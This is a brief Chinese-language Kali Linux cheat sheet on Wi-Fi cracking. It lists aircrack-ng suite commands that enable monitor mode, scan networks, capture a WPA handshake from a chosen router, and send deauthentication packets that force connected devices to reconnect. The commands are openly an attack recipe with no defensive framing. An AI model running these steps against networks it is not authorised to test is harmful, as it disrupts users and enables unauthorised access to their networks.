# Kali

## WIFI 破解

### 准备工作

1. 列出监听模式的网卡: `airmon-ng`
2. 启动监听模式: `airmon-ng start wlan0`
3. 查看监听列表: `iwconfig`

### 抓包

成功抓包会出现`WPA handshake`提示

- 扫描 WIFI: `airodump-ng 接口名(如wlan0mon)`
- 抓包`airodump-ng -c 信道(CH值) --bssid 路由Mac -w ~/Desktop wlan0mon`

### 攻击

强制设备重新连接到网络

- 攻击三次: `aireplay-ng -0 3 -a 路由 Mac wlam0mon`
